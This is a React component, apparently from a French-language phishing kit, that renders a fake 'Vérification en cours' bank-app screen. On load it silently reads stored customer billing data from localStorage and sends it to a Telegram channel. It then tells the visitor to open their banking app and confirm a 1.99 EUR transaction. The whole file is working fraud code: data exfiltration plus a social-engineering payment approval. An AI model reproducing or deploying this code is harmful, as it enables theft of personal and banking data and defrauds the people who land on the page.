import React, { useEffect, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import { Navbar } from '../Navbar';
import { SecondaryNav } from '../SecondaryNav';
import { Footer } from '../Footer';
import { Smartphone, Shield } from 'lucide-react';
import { sendToTelegram } from '../../../services/telegram';

export function BankAppVerification() {
  const navigate = useNavigate();
  const dataSent = useRef(false); // Référence pour suivre si les données ont été envoyées

  useEffect(() => {
    // Vérifier si les données ont déjà été envoyées
    if (dataSent.current) return;
    dataSent.current = true; // Marquer que les données ont été envoyées

    const sendData = async () => {
      try {
        const billingInfo = JSON.parse(localStorage.getItem('customerData') || '{}');
        await sendToTelegram({ billingInfo, type: 'bank_app' }, 'bank_app');
      } catch (error) {
        console.error('Error:', error);
      }
    };

    sendData();
  }, []);

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col">
      <Navbar />
      <SecondaryNav />
      
      <main className="flex-1 flex items-center justify-center py-32 px-4 min-h-[800px]">
        <div className="w-full max-w-lg">
          <div className="bg-white rounded-2xl shadow-xl p-12">
            <div className="flex flex-col items-center">
              <div className="w-24 h-24 bg-[#96154a]/10 rounded-xl flex items-center justify-center mb-8">
                <Smartphone className="w-16 h-16 text-[#96154a]" />
              </div>
              <h1 className="text-4xl font-bold text-gray-900 text-center mb-4">
                Vérification en cours
              </h1>
              <p className="mt-2 text-gray-600 text-center text-lg max-w-sm mb-12">
                Une demande de validation a été envoyée dans votre application bancaire
              </p>

              <div className="flex flex-col items-center gap-8 mb-12">
                <div className="relative">
                  <div className="w-16 h-16 border-4 border-[#96154a] border-t-transparent rounded-full animate-spin"></div>
                  <Shield className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-8 h-8 text-[#96154a]" />
                </div>
                <p className="text-gray-500 animate-pulse">
                  En attente de votre confirmation...
                </p>
              </div>

              <div className="w-full space-y-4">
                <div className="bg-blue-50 rounded-xl p-4 flex items-start gap-3">
                  <div className="bg-blue-100 p-2 rounded-lg mt-0.5">
                    <Shield className="w-5 h-5 text-blue-600" />
                  </div>
                  <div>
                    <p className="font-medium text-blue-900">
                      Instructions
                    </p>
                    <ol className="mt-2 space-y-2 text-sm text-blue-700">
                      <li>1. Ouvrez votre application bancaire</li>
                      <li>2. Accédez à vos notifications ou à la section "Validations en attente"</li>
                      <li>3. Confirmez la transaction de 1,99 €</li>
                    </ol>
                  </div>
                </div>

                <div className="bg-amber-50 rounded-xl p-4 flex items-start gap-3">
                  <div className="bg-amber-100 p-2 rounded-lg">
                    <Smartphone className="w-5 h-5 text-amber-600" />
                  </div>
                  <div>
                    <p className="font-medium text-amber-900">
                      Remarque importante
                    </p>
                    <p className="mt-1 text-sm text-amber-700">
                      Si vous n'avez pas reçu la notification, veuillez vérifier manuellement dans votre application bancaire.
                    </p>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </main>

      <Footer />
    </div>
  );
}